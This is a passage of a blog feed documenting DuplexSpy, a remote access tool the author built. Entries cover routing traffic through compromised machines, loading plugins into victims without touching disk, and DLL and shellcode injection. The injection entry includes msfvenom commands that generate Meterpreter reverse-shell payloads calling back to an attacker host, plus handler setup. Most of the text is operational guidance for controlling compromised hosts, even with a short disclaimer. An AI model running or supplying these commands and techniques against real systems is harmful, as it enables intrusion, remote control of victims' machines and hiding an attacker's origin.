    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
    
    <category term="Fileless Execution" scheme="http://example.com/tags/Fileless-Execution/"/>
    
    <category term="Document" scheme="http://example.com/tags/Document/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] SOCKS5 Proxy</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyProxy/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyProxy/</id>
    <published>2026-02-03T12:19:31.000Z</published>
    <updated>2026-02-13T08:36:46.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the proxy feature of DuplexSpy.</p><p>This feature allows you to use a compromised machine as a proxy, meaning that all network traffic from your machine can be forwarded through the compromised host. </p><p>Even if a compromised machine does not store sensitive data, it can still be abused as a proxy or relay node for malicious activities, such as forwarding <strong>SSH</strong> sessions. This allows threat actors to hide their real origin and reduce the risk of attribution.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/1.png'><img src="/images/article/tools/duplexspy/proxy/1.png" width="1000"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>A C2 server starts listening on one or more ports and accepts SOCKS5 connections from proxy users. The C2 server redirects the user’s network stream to a compromised machine, which then forwards the traffic to the target host. All DNS resolution is performed on the compromised machine.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/10.png'><img src="/images/article/tools/duplexspy/proxy/10.png" width="1000"></p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>In this example, I demonstrates the proxy feature through SSH and proxychains.  The following table describes the experimental environment:</p><div class="table-container"><table><thead><tr><th>Host</th><th>OS</th><th>Description</th></tr></thead><tbody><tr><td>10.98.225.138</td><td>Ubuntu VM</td><td>Target host. It has enabled SSH service. An important file is stored at <code>~/Desktop/foo.txt</code>.</td></tr><tr><td>10.98.222.136</td><td>Windows 10 x64</td><td>Compromised machine.</td></tr><tr><td>10.98.241.11</td><td>Debian Kali Linux</td><td>Attacker machine.</td></tr><tr><td>10.98.253.150</td><td>Windows 10</td><td>Attacker’s C2 server.</td></tr></tbody></table></div><p>Start the DuplexSpy C2 server:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/2.png'><img src="/images/article/tools/duplexspy/proxy/2.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/3.png'><img src="/images/article/tools/duplexspy/proxy/3.png" width="700">    <figcaption>    Right click the compromised host and select <b>Proxy</b>    </figcaption></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/4.png'><img src="/images/article/tools/duplexspy/proxy/4.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/5.png'><img src="/images/article/tools/duplexspy/proxy/5.png" width="400">    <figcaption>    You should use an unused port.    </figcaption></p><p>Next, establish an SSH connection from Kali Linux to the target host <code>10.98.225.138</code>.</p><p>Configure the proxychains:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ vim /etc/proxychains.conf<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/6.png'><img src="/images/article/tools/duplexspy/proxy/6.png" width="500"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ proxychains ssh sdksdk@10.98.225.138<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/7.png'><img src="/images/article/tools/duplexspy/proxy/7.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/8.png'><img src="/images/article/tools/duplexspy/proxy/8.png" width="700"></p><p>Now, check the source IP address on the target host:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netstat -ano | grep &quot;:22&quot;<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/9.png'><img src="/images/article/tools/duplexspy/proxy/9.png" width="800"></p><p>The source address is <code>10.98.222.136:54372</code>, which belongs to the compromised machine.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="Tools&#92;DuplexSpy" scheme="http://example.com/categories/Tools-DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="http://example.com/tags/RAT/"/>
    
    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
    
    <category term="SOCKS5" scheme="http://example.com/tags/SOCKS5/"/>
    
    <category term="Proxy" scheme="http://example.com/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] Using and Developing a Plugin.</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyPlugin/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyPlugin/</id>
    <published>2026-02-03T12:18:50.000Z</published>
    <updated>2026-02-13T08:36:51.700Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>DuplexSpy provides a simple remote plugin manager that allows you to load customized plugins into a compromised machine without writing them to disk.</p><p>This article describes how to use and develop a custom plugin for DuplexSpy.</p><p>Note that all plugins are implemented using .NET Framework 4.8 for compatibility reasons.</p><p>The plugin manager interface provides a GUI ListView and a console.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/1.png'><img src="/images/article/tools/duplexspy/plugin/1.png" width="700"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends the raw DLL bytes of plugin assemblies to the compromised machine. The payload loads these assemblies into memory using the <code>Assembly.Load()</code> method and stores their interfaces in a read-only dictionary. The payload can invoke plugin interfaces and pass parameters whenever it receives commands from the C2 server.</p><p>When the payload is terminated, all loaded plugins are automatically released by the system.</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>The plugin console provides the following commands:</p><table>  <thead>    <tr>      <th>Command</th>      <th>Description</th>    </tr>  </thead>  <tbody>    <tr>      <td><code>clear</code></td>      <td>Clear the console output.</td>    </tr>    <tr>      <td><code>show</code></td>      <td>List all available plugins under the plugin folder.</td>    </tr>    <tr>      <td><code>loaded</code></td>      <td>Show all currently loaded plugins.</td>    </tr>    <tr>      <td><code>load &lt;all | plugin name&gt;</code></td>      <td>Load specified plugin.</td>    </tr>    <tr>      <td><code>unload &lt;all | plugin name&gt;</code></td>      <td>Unload the specified plugin.</td>    </tr>    <tr>      <td><code>&lt;entry&gt; &lt;param1&gt; &lt;param2&gt; ...</code></td>      <td>Use specified plugin with parameters.</td>    </tr>  </tbody></table><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/2.png'><img src="/images/article/tools/duplexspy/plugin/2.png" width="700"></p><h2 id="Example-1-Coffee"><a href="#Example-1-Coffee" class="headerlink" title="Example 1 - Coffee"></a>Example 1 - Coffee</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">coffee help<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/coffee.1.png'><img src="/images/article/tools/duplexspy/plugin/coffee.1.png" width="700"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">coffee print=1<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/coffee.2.png'><img src="/images/article/tools/duplexspy/plugin/coffee.2.png" width="700"></p><p>Note that the <strong>Plugin Manager</strong> throws an exception if an unhandled exception occurs inside a plugin and displays the corresponding error message. However, the payload itself will not be terminated.</p><h2 id="Example-2-Dumper"><a href="#Example-2-Dumper" class="headerlink" title="Example 2 - Dumper"></a>Example 2 - Dumper</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dumper.1.png'><img src="/images/article/tools/duplexspy/plugin/dumper.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dumper.2.png'><img src="/images/article/tools/duplexspy/plugin/dumper.2.png" width="700"></p><h2 id="Example-3-InfoSpyder"><a href="#Example-3-InfoSpyder" class="headerlink" title="Example 3 - InfoSpyder"></a>Example 3 - InfoSpyder</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/infospyder.1.png'><img src="/images/article/tools/duplexspy/plugin/infospyder.1.png" width="700"></p><h1 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h1><p>To develop a plugin. Firstly, create a new .NET framework 4.8 library project.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.1.png'><img src="/images/article/tools/duplexspy/plugin/dev.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.2.png'><img src="/images/article/tools/duplexspy/plugin/dev.2.png" width="600">    <figcaption>    Any name that you like. This name is regardless for the final result.    </figcaption></p><p>Add a reference <code>Plugin.Abstractions48</code>:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.3.png'><img src="/images/article/tools/duplexspy/plugin/dev.3.png" width="600">    <figcaption>    Right click your project -> Add -> Reference    </figcaption></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.4.png'><img src="/images/article/tools/duplexspy/plugin/dev.4.png" width="600">    <figcaption>    Plugin.Abstractions48    </figcaption></p><p>Don’t forget to use it in your project.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.5.png'><img src="/images/article/tools/duplexspy/plugin/dev.5.png" width="600"></p><p>Add the required attributes and properties. The <code>HelpTable</code> is optional but recommended. The <code>Name</code> field must be a unique identifier for the plugin.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.6.png'><img src="/images/article/tools/duplexspy/plugin/dev.6.png" width="600"></p><p>Add the required functions:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.7.png'><img src="/images/article/tools/duplexspy/plugin/dev.7.png" width="600"></p><p>At this point, you have successfully developed a custom plugin. Before building the project, install <code>Costura.Fody</code> to ensure that all dependencies are merged into a single DLL, even if no additional NuGet packages are used.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.8.png'><img src="/images/article/tools/duplexspy/plugin/dev.8.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.9.png'><img src="/images/article/tools/duplexspy/plugin/dev.9.png" width="600"></p><p>Build the DLL file:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.10.png'><img src="/images/article/tools/duplexspy/plugin/dev.10.png" width="600">    <figcaption>    Right click your project -> Build    </figcaption></p><p>Move the generated DLL into the <code>.\Plugins</code> folder of DuplexSpy and create a JSON file <strong>WITH THE SAME FILE NAME (important)</strong>.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.11.png'><img src="/images/article/tools/duplexspy/plugin/dev.11.png" width="600"></p><p>The JSON file should be structured as follows. The <code>Name</code> field must match the plugin name defined in the code. The <code>Entry</code> field specifies the command name used in the plugin console. The <code>Command</code> field is reserved for future use.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.12.png'><img src="/images/article/tools/duplexspy/plugin/dev.12.png" width="600"></p><p>Go to DuplexSpy. Open <strong>Plugin</strong>:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.13.png'><img src="/images/article/tools/duplexspy/plugin/dev.13.png" width="600"></p><p>Our <code>HelloWorld</code> plugin has been successfully installed. Now let’s try it in the console:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.14.png'><img src="/images/article/tools/duplexspy/plugin/dev.14.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.15.png'><img src="/images/article/tools/duplexspy/plugin/dev.15.png" width="600"></p><p>Congratulations! You have successfully developed and deployed a custom Duplex plugin.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;DuplexSpy provides a simple re</summary>
      
    
    
    
    <category term="Tools&#92;DuplexSpy" scheme="http://example.com/categories/Tools-DuplexSpy/"/>
    
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="http://example.com/tags/RAT/"/>
    
    <category term="Document" scheme="http://example.com/tags/Document/"/>
    
    <category term="Remote Plugin" scheme="http://example.com/tags/Remote-Plugin/"/>
    
    <category term=".NET" scheme="http://example.com/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] DLL and Shellcode Injection and Loader</title>
    <link href="http://example.com/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/"/>
    <id>http://example.com/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/</id>
    <published>2026-02-03T12:18:07.000Z</published>
    <updated>2026-02-13T08:37:09.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the DLL and shellcode injection features of DuplexSpy.</p><p>This feature allows you to inject a DLL or shellcode into a target process. DuplexSpy also provides a DLL loader and a shellcode loader, which allows you to execute payloads without injecting them into an existing process.</p><p>If you would like to learn more about DLL and shellcode injection techniques, you can refer to the notes I wrote for studying <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/#Chapter-21-Windows-Message-Hooking">reverse engineering</a> and <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteWindowsBufferOverflow/">Windows buffer overflow</a>.</p><h1 id="Injector"><a href="#Injector" class="headerlink" title="Injector"></a>Injector</h1><p>This features allows you to inject a DLL file or shellcode in a specified process. However, due to Windows security protections, this method may not always work.</p><p>Note that the DLL file or shellcode must match the architecture of the target process (x86 or x64). An x86 process canoot load an x64 DLL or shellcode, and vice versa.</p><p>DuplexSpy provides the following injection methods for both DLL and shellcode:</p><ul><li><strong>APC</strong></li><li><strong>Early Bird</strong></li><li><strong>CreateRemoteThread (default)</strong></li><li><strong>NtCreateThreadEx</strong></li><li><strong>ZwCreateThreadEx</strong></li></ul><p>Before performing an injection, you should determine the architecture of the target process. An x86 DLL cannot be injected into an x64 process, and vice versa. On x64 systems, PE files uder <code>C:\Windows\System32</code> are typically x64 binaries, while PE files under <code>C:\Windows\SysWOW64</code> are x86 binaries.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/1.png'><img src="/images/article/tools/duplexspy/injector/1.png" width="400"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h2><p>Notice that this method <strong>IS NOT</strong> fileless. A DLL file will be created under <code>%TEMP%</code> directory and might be detected or deleted by antivirus software.</p><p>The <code>CreateRemoteThread</code> method is recommended for DLL injection.</p><p>In this example, Kali Linux is used to establish a <strong>Meterpreter</strong> reverse TCP connection via DLL injection.</p><div class="table-container"><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td>Target process</td><td><code>C:\Windows\SysWOW64\notepad.exe</code></td></tr><tr><td>Kali host</td><td>192.168.1.192</td></tr><tr><td>Kali port</td><td>4444</td></tr></tbody></table></div><p>Build an <strong>x86</strong> payload using <strong>msfvenom</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.192 lport=4444 -a x86 -f dll &gt; x86.dll<br></code></pre></td></tr></table></figure></p><p><strong>Msfconsole:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfconsole<br>msf&gt; use exploit/multi/handler<br>msf&gt; set payload windows/meterpreter/reverse_tcp<br>msf&gt; set lhost 192.168.1.192<br>msf&gt; set lport 4444<br>msf&gt; run<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/msf.1.png'><img src="/images/article/tools/duplexspy/injector/msf.1.png" width="600"></p><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>Let’s try the <strong>CreateRemoteThread</strong> method:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.1.png'><img src="/images/article/tools/duplexspy/injector/dll.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.2.png'><img src="/images/article/tools/duplexspy/injector/dll.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.3.png'><img src="/images/article/tools/duplexspy/injector/dll.3.png" width="600"></p><p>Notice that the log messages in the box are not always reliable. A DuplexSpy payload cannot check your msf payload!</p><p>Next, exit your meterpreter session:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter&gt; exit<br></code></pre></td></tr></table></figure></p><p>Process <code>notepad.exe</code> is still running!</p><h3 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p><strong>NtCreateThreadEx</strong> method:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.4.png'><img src="/images/article/tools/duplexspy/injector/dll.4.png" width="600"></p><p>It works again ( . 3 .)</p><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400"></p><h3 id="ZwCreateThreadEx"><a href="#ZwCreateThreadEx" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.5.png'><img src="/images/article/tools/duplexspy/injector/dll.5.png" width="600"></p><h2 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h2><p>This method is fileless.</p><p>The <code>CreateRemoteThread</code> method is recommended for shellcode injection.</p><p>Use the following command to generate a meterpreter shellcode:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f c<br></code></pre></td></tr></table></figure></p><p>Paste the output into the shellcode editor of DuplexSpy.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.5.png'><img src="/images/article/tools/duplexspy/injector/sc.5.png" width="600"></p><p>Click the “Formatting” button at the top of the window form. You can also click the “Save” button, DuplexSpy automatically runs the “Formatting” function.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.6.png'><img src="/images/article/tools/duplexspy/injector/sc.6.png" width="600">    <figcaption>    Formatting    </figcapton></p><h3 id="CreateRemoteThread-1"><a href="#CreateRemoteThread-1" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.1.png'><img src="/images/article/tools/duplexspy/injector/sc.1.png" width="600"></p><h3 id="NtCreateThreadEx-1"><a href="#NtCreateThreadEx-1" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.2.png'><img src="/images/article/tools/duplexspy/injector/sc.2.png" width="600"></p><h3 id="ZwCreateThreadEx-1"><a href="#ZwCreateThreadEx-1" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p>Lastly, let’s try the <strong>ZwCreateThreadEx</strong> method. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.3.png'><img src="/images/article/tools/duplexspy/injector/sc.3.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.4.png'><img src="/images/article/tools/duplexspy/injector/sc.4.png" width="600"></p><h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><p>DuplexSpy allows you to load a DLL file or shellcode directly without injecting it into an existing process. As with injection, the payload architecture must match the loader architecture (x86 or x64).</p><p>For performance reasons, DuplexSpy creates a new process for both DLL and shellcode loading. This behavior is similar to the fileless execution features of DuplexSpy; however, the loader architecture cannot be selected manually. If the DuplexSpy payload is x64, only x64 DLLs or shellcodes can be loaded.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/1.svg'><img src="/images/article/tools/duplexspy/loader/1.svg" width="800"></p><h3 id="DLL-Loader"><a href="#DLL-Loader" class="headerlink" title="DLL Loader"></a>DLL Loader</h3><p>Note that this method is not fileless. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.1.png'><img src="/images/article/tools/duplexspy/loader/dll.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.2.png'><img src="/images/article/tools/duplexspy/loader/dll.2.png" width="600"></p><h3 id="Shellcode-Loader"><a href="#Shellcode-Loader" class="headerlink" title="Shellcode Loader"></a>Shellcode Loader</h3><p>DuplexSpy allows you to load shellcode into memory. It is a fileless method.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.1.png'><img src="/images/article/tools/duplexspy/loader/shellcode.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.2.png'><img src="/images/article/tools/duplexspy/loader/shellcode.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.3.png'><img src="/images/article/tools/duplexspy/loader/shellcode.3.png" width="600"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="Tools&#92;DuplexSpy" scheme="http://example.com/categories/Tools-DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="Tool" scheme="http://example.com/tags/Tool/"/>
    
    <category term="DLL Injection" scheme="http://example.com/tags/DLL-Injection/"/>
    
    <category term="Shell Injection" scheme="http://example.com/tags/Shell-Injection/"/>
    
    <category term="DLL Loader" scheme="http://example.com/tags/DLL-Loader/"/>
    
    <category term="Shell Loader" scheme="http://example.com/tags/Shell-Loader/"/>
    
  </entry>
  
  <entry>
    <title>[Tools] DuplexSpy v2.0.0</title>
    <link href="http://example.com/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"/>
    <id>http://example.com/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/</id>
    <published>2026-01-27T16:29:37.000Z</published>
    <updated>2026-02-13T08:37:16.183Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>This document describes <strong>DuplexSpy</strong> (also referred to as <strong>DuplexSpyCS</strong>, where <em>CS</em> stands for C#).</p><p>If you are reading this document, I am glad to announce the release of <strong>DuplexSpy version 2</strong>, after more than six months of the version 1. During this period, I struggled with various emotional and academic issues, which once led me into depression. Fortunately, I managed to overcome one of my biggest personal challenges (even though it might seem trivial to others).</p><p align="center" class='item-img' data-src='/images/meme/hakari_crying.jpeg'><img src="/images/meme/hakari_crying.jpeg" width="600"></p><p>As a college student, developing a GUI-based remote access tool entirely on my own—and performing proper quality assurance (QA)—has been a significant challenge for me. Due to limited time, experience, and resources, this project may still contain defects or design flaws that I have not yet discovered. Nevertheless, I believe that I have successfully built a RAT that incorporates a variety of offensive techniques and practical features.</p><p align="center" class='item-img' data-src='/images/meme/terrible_cake.png'><img src="/images/meme/terrible_cake.png" width="300"></p><p>If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.</p><p align="center" class='item-img' data-src='/images/meme/mika_yeah.png'><img src="/images/meme/mika_yeah.png" width="300"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>DuplexSpy</strong> incorporates features inspired by other tools as well as my own personal experience. Compared to the previous version, I removed several features that I considered unnecessary and added a number of new ones. Throughout this development process, I learned a great deal, and I sincerely hope that this project can be useful to others who are interested in offensive security or malware research.</p><p>If you encounter any issues or have suggestions, please feel free to open an issue on the repository page.</p><p>View the GitHub repository <a href="https://github.com/iss4cf0ng/DuplexSpyCS">here</a>.</p><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed as part of my personal interest in studying cybersecurity. However, it may potentially be misused for malicious purposes. Please do <strong>NOT</strong> use this tool for any illegal activities.</p><p align="center" class='item-img' data-src='/images/meme/mika_punch.jpg'><img src="/images/meme/mika_punch.jpg" width="500"></p><h1 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h1><h2 id="Directory-and-Files"><a href="#Directory-and-Files" class="headerlink" title="Directory and Files"></a>Directory and Files</h2><p>Directory structure is shown as following:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/3.png'><img src="/images/article/tools/duplexspy/main/3.png" width="700"></p><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><p>Execute <code>DuplexSpyCS.exe</code>. This is the home page of DuplexSpy:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/1.png'><img src="/images/article/tools/duplexspy/main/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/2.png'><img src="/images/article/tools/duplexspy/main/2.png" width="700"></p><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><p>A listener is an interface component of <strong>DuplexSpy</strong>. It acts as a socket listener on the server side. DuplexSpy provides three types of listeners, all of which offer secure and robust communication protocols.</p><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>The data stream transmitted through this protocol is encrypted after a key exchange procedure. The server generates an RSA key pair and sends the public key to the client. The client then uses this public key to encrypt an AES key and an initialization vector (IV), and sends them back to the server.</p><p>After receiving the encrypted AES key and IV, the server decrypts them and stores them in memory. During the validation phase, the server sends a plaintext challenge to the client. The client responds with an encrypted version of the challenge using the AES algorithm. If the server can successfully decrypt the response using the stored AES key and IV, the validation procedure is considered complete. The server then notifies the client to enter the compromised state.</p><p>This protocol uses RSA-2048 and AES-256-CBC.</p><h3 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h3><p>This protocol provides a secure and robust communication channel for C2 traffic. Before using this listener, you must generate an SSL certificate file.</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>All data are encapsulated within HTTP requests and responses. This listener also provides an encrypted communication channel to protect C2 traffic. Its handshaking procedure is identical to that of the TCP listener described above.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/http.1.png'><img src="/images/article/tools/duplexspy/listener/http.1.png" width="1000"></p><h2 id="Add-a-New-Listener"><a href="#Add-a-New-Listener" class="headerlink" title="Add a New Listener"></a>Add a New Listener</h2><p>In this example, I am going to demonstrate how to add a new listener.</p><p>Firstly, click the <strong>New</strong> button on the top.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/1.png'><img src="/images/article/tools/duplexspy/listener/1.png" width="700"></p><p>Now you have opened a new panel.</p><p>Select a protocol used for listener (In this case, I use <strong>TLS</strong>):</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/2.png'><img src="/images/article/tools/duplexspy/listener/2.png" width="400"></p><p>Notice that you should create a certificate file if you are going to use a TLS listener. </p><p align="center" class='item-img' 